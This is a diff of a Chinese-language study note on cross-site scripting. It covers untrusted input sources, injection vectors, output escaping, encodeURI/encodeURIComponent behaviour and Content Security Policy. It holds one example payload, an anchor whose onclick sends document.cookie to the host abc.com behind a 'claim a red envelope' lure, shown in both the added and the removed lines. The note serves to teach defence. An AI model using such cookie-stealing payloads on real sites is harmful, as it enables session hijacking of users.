@@ -1,8 +1,43 @@
+https://tech.meituan.com/2018/09/27/fe-security.html
+
 ## Cross-Site Scripting XSS
 
-跨站脚本 (Cross-Site Scripting, XSS): 一种代码注入方式, 为了与 CSS 区分所以被称作 XSS. 
+跨站脚本 (Cross-Site Scripting, XSS): 一种代码注入攻击, 为了与 CSS 区分所以被称作 XSS. 
 
-XSS 通过修改 HTML 节点或者执行 JS 代码来攻击网站。
+
+
+XSS的本质是：恶意代码未经过过滤，与网站的正常代码混在一起，利用浏览器对于内容的信任，执行了恶意代码
+
+不可信任的信息
+
+- 用户的UGC信息 （User Gnerate Content）
+- 第三方的链接
+- URL参数
+
+
+
+例子🌰
+
+```html
+<a href="#" onclick=`window.location=http://abc.comcookie=${docuemnt.cookie}`>领取红包</a>
+```
+
+
+
+要素
+
+1. 攻击者提交恶意代码。
+2. 浏览器执行恶意代码。
+
+
+
+有哪些注入的方法？
+
+- script
+- 拼接的数据超出了原本的限制🚫
+- 在标签的 href、src 等属性中，包含 `javascript:` 等可执行代码。
+
+
 
 所以不能讲拿到的string直接作为html插入
 
@@ -30,14 +65,6 @@ Don't get confused by the differences between `Node.textContent` and [`HTMLEleme
 
 
 
-例子🌰
-
-```html
-<a href="#" onclick=`window.location=http://abc.comcookie=${docuemnt.cookie}`>领取红包</a>
-```
-
-
-
 ## 如何防御？
 
 转义输入输出的内容，对于引号，尖括号，斜杠进行转义
@@ -59,7 +86,32 @@ function escape(str) {
 
 
 
-还有个方案是[CSP](https://content-security-policy.com/) Content Security Policy
+```js
+var set1 = ";,/?:@&=+$";  // Reserved Characters
+var set2 = "-_.!~*'()";   // Unescaped Characters
+var set3 = "#";           // Number Sign
+var set4 = "ABC abc 123"; // Alphanumeric Characters + Space
+
+console.log(encodeURI(set1)); // ;,/?:@&=+$
+console.log(encodeURI(set2)); // -_.!~*'()
+console.log(encodeURI(set3)); // #
+console.log(encodeURI(set4)); // ABC%20abc%20123 (the space gets encoded as %20)
+
+console.log(encodeURIComponent(set1)); // %3B%2C%2F%3F%3A%40%26%3D%2B%24
+console.log(encodeURIComponent(set2)); // -_.!~*'()
+console.log(encodeURIComponent(set3)); // %23
+console.log(encodeURIComponent(set4)); // ABC%20abc%20123 (the space gets encoded as %20)
+```
+
+
+
+### 还有个方案是[CSP](https://content-security-policy.com/) Content Security Policy
 
 The Content-Security-Policy header allows you to restrict how resources such as JavaScript, CSS, or pretty much anything that the browser loads.
+
+To enable CSP, you need to configure your web server to return the [`Content-Security-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) HTTP header. 
+
+Alternatively, the [``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta) element can be used to configure a policy, for example: `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">`
+
+- 禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。
 
